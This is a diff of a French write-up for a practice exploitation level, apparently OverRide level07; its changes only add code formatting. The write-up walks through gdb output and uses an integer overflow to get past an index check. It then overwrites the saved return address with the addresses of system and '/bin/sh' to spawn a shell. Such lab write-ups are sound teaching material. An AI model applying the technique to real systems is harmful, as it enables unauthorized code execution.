@@ -197,7 +197,7 @@ Input command: store
 0xffffd560:	0x00000000	0x00000000	0x00000000	0x00000000
 
 ```
-Nous retrouvons notr 42 en 0xffffd548, donc le debut de notre tableau est en 0xffffd544
+Nous retrouvons notr 42 en 0xffffd548, donc le debut de notre `tableau` est en `0xffffd544`
 EIP:
 ```
 (gdb) info frame
@@ -209,8 +209,8 @@ Stack level 0, frame at 0xffffd710:
   ebx at 0xffffd6fc, ebp at 0xffffd708, esi at 0xffffd700, edi at 0xffffd704, eip at 0xffffd70c
 
 ```
-adresse eip -> 0xffffd70c
-Faisons la difference entre 0xffffd70c et 0xffffd544
+`adresse eip -> 0xffffd70c`
+`Faisons la difference entre 0xffffd70c et 0xffffd544`
 0xffffd70c - 0xffffd544 = 456
 456 / 4 = 114 (/4 car tableau d'int).
 ```
@@ -220,17 +220,17 @@ Input command: read
  Completed read command successfully
 
 ```
-4158936339 en hexa -> F7E45513
-Cela correspond bien a l'adresse de notre saved eip.
+`4158936339 en hexa -> F7E45513`
+Cela correspond bien a l'adresse de notre `saved eip`.
 Or, nous ne pouvons pas reecrire directement sur l'index 114 car c'est un multiple de 3,
 mais nous savons que les int peuvent overflow ici.
-Pour faire cela, nous allons prendre notre index, 114 et le multiplier par 4 ce qui egal a 456,
-or multiplier par 4 reviens a 114 << 2 donc en binaire, 
-114 = 00000000000000000000000001110010
-456 = 00000000000000000000000111001000
+Pour faire cela, nous allons prendre notre index, `114 et le multiplier par 4` ce qui egal a `456`,
+or `multiplier par 4` reviens a `114 << 2` donc en binaire, 
+`114 = 00000000000000000000000001110010`
+`456 = 00000000000000000000000111001000`
 Il y a bien un decalage de 2 bytes vers la gauche.
 Donc les 2 derniers bytes (tout a gauche) ne sont pas pris en compte ici.
-10000000000000000000000001110010 = 2147483762
+`10000000000000000000000001110010 = 2147483762`
 Maintenant que nous avons notre index, allons recuper l'adresse de system et d'un "/bin/sh",
 ```
 (gdb) info func system
@@ -245,10 +245,10 @@ Non-debugging symbols:
 warning: Unable to access target memory at 0xf7fd3b74, halting search.
 1 pattern found.
 ```
-addr system -> 0xf7e6aed0 = 4159090384
-addr "/bin/sh" -> 0xf7f897ec = 4160264172
-Executons maintenant le code en placant l'addr de system a l'index de 114 (2147483762),
-et placons l'addr de "bin/sh" a 116, juste apres.
+`addr system -> 0xf7e6aed0 = 4159090384`
+`addr "/bin/sh" -> 0xf7f897ec = 4160264172`
+Executons maintenant le code en placant l'`addr de system a l'index de 114 (2147483762)`,
+et placons l'`addr de "bin/sh" a 116`, juste apres.
 ```
 level07@OverRide:~$ ./level07 
 ----------------------------------------------------
